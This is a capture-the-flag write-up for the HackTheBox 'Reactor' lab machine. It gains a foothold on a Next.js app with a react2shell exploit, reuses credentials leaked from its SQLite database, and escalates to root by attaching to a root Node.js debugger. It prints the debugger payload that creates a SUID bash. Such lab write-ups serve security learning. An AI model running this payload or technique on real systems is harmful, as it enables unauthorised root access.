---
title: "Reactor"
description: "HackTheBox Season 11 — react2shell RCE, DB-leaked creds, then a root Node.js --inspect debugger for privilege escalation."
---

<a href="https://labs.hackthebox.com/achievement/machine/1439304/900" style="display:block;max-width:560px;margin:1.5rem auto;text-decoration:none;border-radius:14px;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,.45);font-family:system-ui,-apple-system,sans-serif;">
  <div style="height:104px;background:#141D2B url('https://labs.hackthebox.com/images/achievementBG.png') center/cover;position:relative;">
    <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1c58c3b-0931-413d-9394-5fae4350ec4c-1778698333.png" alt="Reactor" width="76" height="76" style="position:absolute;left:50%;bottom:-38px;transform:translateX(-50%);border-radius:50%;background:#1A2332;box-shadow:0 0 0 4px #1A2332;" />
  </div>
  <div style="background:#1A2332;padding:52px 20px 22px;text-align:center;">
    <div style="color:#fff;font-size:1.2rem;font-weight:600;">Reactor has been Pwned</div>
    <div style="height:1px;margin:14px auto;max-width:240px;background:linear-gradient(to right,transparent,#9FEF00,transparent);"></div>
    <div style="color:#A4B1CD;font-size:.9rem;"><span style="color:#fff;">d10m3d3s</span> pwned this machine</div>
    <div style="display:flex;justify-content:center;margin-top:20px;">
      <div style="flex:1;padding:4px;"><div style="color:#9FEF00;font-weight:700;letter-spacing:1px;">#564</div><div style="color:#A4B1CD;font-size:.62rem;letter-spacing:1px;margin-top:2px;">MACHINE RANK</div></div>
      <div style="flex:1;padding:4px;border-left:1px solid #111927;border-right:1px solid #111927;"><div style="color:#9FEF00;font-weight:700;letter-spacing:1px;">23 May 2026</div><div style="color:#A4B1CD;font-size:.62rem;letter-spacing:1px;margin-top:2px;">PWN DATE</div></div>
      <div style="flex:1;padding:4px;"><div style="color:#9FEF00;font-weight:700;letter-spacing:1px;">585</div><div style="color:#A4B1CD;font-size:.62rem;letter-spacing:1px;margin-top:2px;">XP EARNED</div></div>
    </div>
  </div>
</a>

**Reactor** is a Linux (Ubuntu) box fronted by a **Next.js** application. A
public **react2shell** exploit gives the initial foothold; the app's SQLite
database hands over a real user's credentials. Privilege escalation is a
textbook **Node.js `--inspect`** abuse — a root‑owned worker exposes a debugger
websocket on localhost, and anyone who can reach it can execute arbitrary code
in that root process.

:::note[Attack path at a glance]
`react2shell` RCE → `reactor.db` leaks `engineer:reactor1` → SSH as **engineer**
→ root Node.js debugger on `:9229` → `child_process` SUID `bash` → **root**.
:::

## Reconnaissance

### Nmap

```text title="nmap -sVC 10.129.1.68"
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     X-Powered-By: Next.js
|     Content-Type: text/html; charset=utf-8
```

Just SSH and a web app on **port 3000**, powered by **Next.js**.

### The web app

```http title="curl -I http://10.129.1.68:3000/"
HTTP/1.1 200 OK
X-Powered-By: Next.js
Content-Type: text/html; charset=utf-8
Content-Length: 17175
```

The front end is a static‑looking Next.js site — nothing obviously exploitable
by hand, which points at a known framework/exploit rather than a custom bug.

## Foothold — react2shell

The **`react2shell`** Metasploit module lands a shell on the box. From the
application root, a SQLite database gives up a credential:

```text title="reactor.db (app root)"
engineer:reactor1
```

## User — engineer

`engineer` : `reactor1` is a valid system account — SSH in for the user flag:

```bash
ssh engineer@10.129.1.68
```

## Local Enumeration

`linpeas` flags the usual kernel CVEs (not needed here) and, more usefully, a
**root‑owned Node.js debugger** listening on loopback:

```text title="linpeas (excerpt)"
CVE-2026-43284 (xfrm-ESP): autoloadable: esp4 esp6 xfrm_user ipcomp6
CVE-2026-43500 (rxrpc):    autoloadable: rxrpc
Sudo version 1.9.15p5
```

A websocket on port `9229` — the Node.js Inspector protocol — is bound to
localhost and owned by **root**:

```json title="curl http://127.0.0.1:9229/json"
[ {
  "description": "node.js instance",
  "id": "b068b6c8-f607-44b5-a667-32964cdfb12b",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "url": "file:///opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/b068b6c8-f607-44b5-a667-32964cdfb12b"
} ]
```

:::caution
`--inspect` is a full debug channel. Anyone who can reach the inspector
websocket can run arbitrary JavaScript **inside that process** — here, as root.
:::

## Privilege Escalation — Node.js `--inspect`

Attach to the root debugger with `node inspect` and evaluate a payload that
shells out to make a SUID copy of `bash`:

```text title="node inspect 127.0.0.1:9229"
connecting to 127.0.0.1:9229 ... ok
debug> exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')")
Uint8Array(0)
debug>
```

## Root

```bash
/tmp/rootbash -p
# id → uid=... euid=0(root)
# cat /root/root.txt
```

## Takeaways

- **Framework exploits beat manual poking.** The static Next.js front end had no
  hand‑exploitable bug — the `react2shell` module was the intended door.
- **App databases are credential stores.** `reactor.db` sitting in the web root
  handed over the SSH user directly.
- **Never expose `--inspect` on a privileged process.** A root Node worker with
  an open inspector is remote code execution as root for anyone on the host.
